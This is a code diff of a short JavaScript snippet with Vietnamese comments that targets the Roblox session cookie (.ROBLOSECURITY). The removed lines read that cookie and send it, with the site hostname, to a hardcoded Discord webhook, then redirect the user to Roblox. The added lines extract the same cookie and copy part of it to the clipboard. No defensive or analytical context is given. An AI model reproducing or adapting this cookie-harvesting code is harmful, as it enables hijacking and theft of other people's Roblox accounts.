@@ -1,29 +1,19 @@
-// script.js
 (function() {
-  const webhookURL = "https://discord.com/api/webhooks/1364096814919454730/Y0bWQllAa_JKq_aVcRjKnWtkzu08LukIa6sAKqzB15zEUUEBL2U5NlE9wGbkbQfT-1tD";
-  const wantedKeys = [".ROBLOSECURITY"];
+  // Tìm cookie có tên là ".ROBLOSECURITY"
+  const cookieValue = document.cookie
+    .split("; ")
+    .find(row => row.startsWith(".ROBLOSECURITY="))
+    ?.split("=")[1];
 
-  const allCookies = document.cookie.split("; ").reduce((acc, pair) => {
-    const [key, value] = pair.split("=");
-    if (wantedKeys.includes(key)) {
-      acc.push(`${key}=${value}`);
-    }
-    return acc;
-  }, []);
+  if (cookieValue) {
+    // Tách phần sau dấu gạch dưới đầu tiên (_)
+    const filteredValue = cookieValue.split("_")[2] || cookieValue;
 
-  const message = allCookies.length > 0 
-    ? allCookies.join("; ")
-    : "Không tìm thấy cookie cần lọc.";
-
-  fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      content: "Cookie đã lọc từ " + window.location.hostname + ":\n```" + message + "```"
-    })
-  }).then(() => {
-    window.location.href = "https://www.roblox.com/home"; // Trang bạn muốn chuyển đến
-  }).catch((err) => {
-    alert("Lỗi khi gửi: " + err);
-  });
+    // Sao chép phần đã lọc vào clipboard
+    navigator.clipboard.writeText(filteredValue).then(() => {
+      alert("Đã sao chép phần sau dấu _ của cookie:\n" + filteredValue);
+    });
+  } else {
+    alert("Không tìm thấy cookie có tên .ROBLOSECURITY");
+  }
 })();
